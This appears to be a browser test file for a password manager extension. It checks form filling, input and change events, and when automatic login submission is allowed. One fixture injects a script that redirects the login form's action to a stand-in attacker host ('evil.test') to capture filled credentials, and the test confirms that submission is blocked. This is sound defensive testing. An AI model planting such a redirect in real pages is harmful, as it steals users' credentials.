// Controlled real-browser checks of form semantics, events and auto-submit.
module.exports = async (page) => {
  const assert = require("node:assert/strict");
  const path = require("node:path");
  const basic =
    '<form method="post" action="/login"><input autocomplete="username"><input type="password" autocomplete="current-password"><button type="submit">Sign in</button></form>';
  async function scenario(html, auto = true, setup = "") {
    await page.route("https://parity.example.test/**", (r) =>
      r.fulfill({ contentType: "text/html", body: html }),
    );
    await page.goto("https://parity.example.test/login");
    await page.addScriptTag({
      path: path.resolve(__dirname, "../browser-extension/core.js"),
    });
    if (setup) await page.addScriptTag({ content: setup });
    const result = await page.evaluate((auto) => {
      let submissions = 0,
        changes = 0;
      document.addEventListener("submit", (event) => {
        event.preventDefault();
        submissions++;
      });
      document.addEventListener("change", () => changes++);
      const filled = LocklarkCore.fillDocument(
        location.origin,
        "test-user",
        "test-password",
        Date.now() + 1500,
        false,
        auto,
      );
      return {
        filled,
        submissions,
        changes,
        values: [...document.querySelectorAll("input")].map((e) => e.value),
      };
    }, auto);
    await page.unroute("https://parity.example.test/**");
    return result;
  }
  let r = await scenario(basic);
  assert.equal(r.filled, true);
  assert.equal(r.submissions, 1);
  assert.equal(r.changes, 2);
  r = await scenario(basic, false);
  assert.equal(r.submissions, 0);
  r = await scenario(
    basic,
    true,
    "document.querySelector('input').addEventListener('input',()=>document.querySelector('form').action='https://evil.test/login');",
  );
  assert.equal(r.filled, true);
  assert.equal(r.submissions, 0);
  r = await scenario(basic.replace("Sign in", "Delete account"));
  assert.equal(r.submissions, 0);
  r = await scenario(basic.replace("current-password", "new-password"));
  assert.equal(r.filled, false);
  assert.equal(r.submissions, 0);
  r = await scenario(
    basic.replace("<button", '<button type="submit">Other</button><button'),
  );
  assert.equal(r.submissions, 0);
  r = await scenario(
    '<form action="/login"><input autocomplete="username"><button>Next</button></form>',
  );
  assert.equal(r.filled, true);
  assert.deepEqual(r.values, ["test-user"]);
  assert.equal(r.submissions, 0);
  r = await scenario(
    '<form action="/login"><input type="password" autocomplete="current-password"><button>Sign in</button></form>',
  );
  assert.equal(r.filled, true);
  assert.deepEqual(r.values, ["test-password"]);
  r = await scenario(
    '<form><input name="search"><button>Search</button></form>',
  );
  assert.equal(r.filled, false);
  r = await scenario(
    basic.replace(
      '<input autocomplete="username">',
      '<input type="search"><input autocomplete="username">',
    ),
  );
  assert.equal(r.filled, true);
  assert.deepEqual(r.values, ["", "test-user", "test-password"]);
  console.log(
    "Chromium login parity: semantic fields, username/password steps, input/change events, safe automatic submission and post-event action revalidation passed",
  );
};
